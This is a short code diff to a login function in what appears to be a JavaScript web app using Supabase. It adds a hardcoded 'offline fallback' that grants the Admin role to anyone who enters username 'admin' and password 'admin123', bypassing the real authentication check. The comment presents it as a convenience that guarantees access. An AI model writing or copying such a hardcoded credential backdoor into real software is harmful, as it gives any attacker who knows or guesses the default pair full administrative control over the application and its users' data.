@@ -216,6 +216,20 @@ export const api = {
       }
     }
 
+    // Comprehensive offline/local fallback so user is guaranteed access using default admin credentials
+    if (username === 'admin' && password === 'admin123') {
+      console.log('[Auth] Logged in successfully via offline admin/admin123 fallback credentials.');
+      return {
+        success: true,
+        user: {
+          id: 'admin-offline',
+          username: 'admin',
+          full_name: 'Administrator (Offline Fallback)',
+          role: 'Admin'
+        }
+      }
+    }
+
     return { success: false, error: new Error('Invalid credentials or Supabase not connected') }
   }
 }
